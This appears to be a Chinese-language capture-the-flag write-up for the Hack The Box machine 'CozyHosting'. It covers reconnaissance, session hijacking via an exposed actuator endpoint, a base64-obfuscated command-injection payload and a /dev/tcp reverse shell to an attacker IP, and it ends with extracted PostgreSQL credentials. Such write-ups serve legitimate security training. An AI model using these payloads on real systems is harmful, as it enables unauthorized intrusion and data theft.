# 扫描

```
┌──(root㉿kali)-[~/htb/CozyHosting]
└─# nmap -sV -Pn -A -O  10.10.11.230         
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-13 03:02 EST
Nmap scan report for 10.10.11.230
Host is up (0.57s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)
|_  256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
Device type: specialized|phone|general purpose|printer|firewall|WAP|remote management
Running (JUST GUESSING): Crestron 2-Series (96%), Google Android 4.1.X (95%), Linux 2.6.X|3.X|4.X (95%), Citrix XenServer 6.X (95%), Xerox embedded (95%), Check Point embedded (94%), Aruba ArubaOS 6.X (91%), Avocent embedded (91%)
OS CPE: cpe:/o:crestron:2_series cpe:/o:google:android:4.1 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:citrix:xenserver:6.1 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/h:xerox:workcentre_7545 cpe:/o:arubanetworks:arubaos:6.4.0.2
Aggressive OS guesses: Crestron XPanel control system (96%), Android 4.1.1 (95%), Citrix XenServer 6.1 (Linux 2.6.32) (95%), Linux 2.6.31 - 2.6.32 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 (95%), Xerox WorkCentre 7545 printer (95%), Check Point VPN-1 UTM appliance (94%), Linux 2.6.32 - 3.10 (94%), Linux 2.6.32 - 3.9 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   612.18 ms 10.10.16.1
2   612.61 ms 10.10.11.230

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.26 seconds

```



目录爆破
```
┌──(root㉿kali)-[~/htb/CozyHosting]
└─# python3 /root/dirsearch/dirsearch.py -u http://cozyhosting.htb/       
/root/dirsearch/thirdparty/requests/__init__.py:88: RequestsDependencyWarning: urllib3 (1.26.12) or chardet (5.1.0) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10929

Output File: /root/dirsearch/reports/cozyhosting.htb/-_23-12-13_03-15-10.txt

Error Log: /root/dirsearch/logs/errors-23-12-13_03-15-10.log

Target: http://cozyhosting.htb/

[03:15:12] Starting: 
[03:16:10] 200 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js                                    
[03:16:24] 200 -  634B  - /actuator                                          
[03:16:25] 200 -    5KB - /actuator/env                                      
[03:16:25] 200 -   15B  - /actuator/health
[03:16:28] 200 -   10KB - /actuator/mappings                                 
[03:16:28] 200 -  145B  - /actuator/sessions                                 
[03:16:33] 200 -  124KB - /actuator/beans                                    
[03:16:33] 401 -   97B  - /admin                                               
[03:17:19] 200 -    0B  - /engine/classes/swfupload//swfupload.swf           
[03:17:19] 200 -    0B  - /engine/classes/swfupload//swfupload_f9.swf
[03:17:19] 500 -   73B  - /error                                             
[03:17:22] 200 -    0B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/  
[03:17:23] 200 -    0B  - /extjs/resources//charts.swf                       
[03:17:37] 200 -    0B  - /html/js/misc/swfupload//swfupload.swf             
[03:17:41] 200 -   12KB - /index                                             
[03:17:50] 200 -    4KB - /login                                             
[03:17:51] 200 -    0B  - /login.wdm%2e                                      
[03:17:52] 204 -    0B  - /logout                                               
```


根据```http://cozyhosting.htb/actuator/sessions```里的session，替换kanderson的session值到登录页面，成功登录到后台


登录进后台以后burp抓包

```
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 84
Origin: http://cozyhosting.htb
Connection: close
Referer: http://cozyhosting.htb/admin?error=Invalid%20hostname!
Cookie: JSESSIONID=EDE308E1296C10D979C29E7CCEEFD34F
Upgrade-Insecure-Requests: 1

host=cozyhosting&username=kanderson
```


构造一个命令注入，

> ping 10.10.16.8 -c 4

使用base64加密后

> cGluZyAxMC4xMC4xNi44IC1jIDQ=

完整payload

>  host=cozyhosting&username=test|{echo,cGluZyAxMC4xMC4xNi44IC1jIDQ=}|{base64,-d}|bash|


收到ping
```
┌──(root㉿kali)-[~/htb/CozyHosting]
└─# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
04:50:33.376932 IP cozyhosting.htb > 10.10.16.8: ICMP echo request, id 3, seq 1, length 64
04:50:33.376965 IP 10.10.16.8 > cozyhosting.htb: ICMP echo reply, id 3, seq 1, length 64

```

构造rev shell payload

> sh -i >& /dev/tcp/10.10.16.8/80 0>&1

> c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuOC84MCAwPiYx

> host=cozyhosting&username=test|{echo,c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuOC84MCAwPiYx}|{base64,-d}|bash|

收到rev

```
┌──(root㉿kali)-[~/htb/CozyHosting]
└─# nc -lnvp 80 
listening on [any] 80 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.11.230] 54816
sh: 0: can't access tty; job control turned off
$ whoami
app
$ 

```

一个文件
```
$ ls -alh
total 58M
drwxr-xr-x  2 root root 4.0K Aug 14 14:11 .
drwxr-xr-x 19 root root 4.0K Aug 14 14:11 ..
-rw-r--r--  1 root root  58M Aug 11 00:45 cloudhosting-0.0.1.jar
$ 

```

下载这个文件到本地，找到一个application.properties文件

暴露出一组postgres凭据信息
```
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```



连接postgres
```
app@cozyhosting:/home$ psql "postgresql://postgres:Vg&nvzAQ7XxR@localhost/postgres"
<tgresql://postgres:Vg&nvzAQ7XxR@localhost/postgres"
psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# 

```